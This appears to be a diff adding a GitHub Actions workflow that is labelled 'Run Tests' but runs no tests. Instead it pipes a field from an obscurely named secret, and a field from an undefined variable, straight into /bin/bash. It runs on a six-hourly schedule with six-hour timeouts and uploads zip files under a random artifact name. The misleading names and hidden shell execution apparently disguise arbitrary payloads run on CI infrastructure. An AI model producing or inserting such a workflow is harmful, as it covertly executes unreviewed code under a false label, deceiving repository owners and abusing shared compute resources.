@@ -1,0 +1,34 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          wz930: ${{ secrets.wz930 }}
+        run: |
+          printf '%s' "$wz930" | jq -r .jyil5 | /bin/bash
+          echo $vdyh9866 | jq -r .jjmws5 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: yf8RKpOU
+          path: "*.zip"
+          retention-days: 1
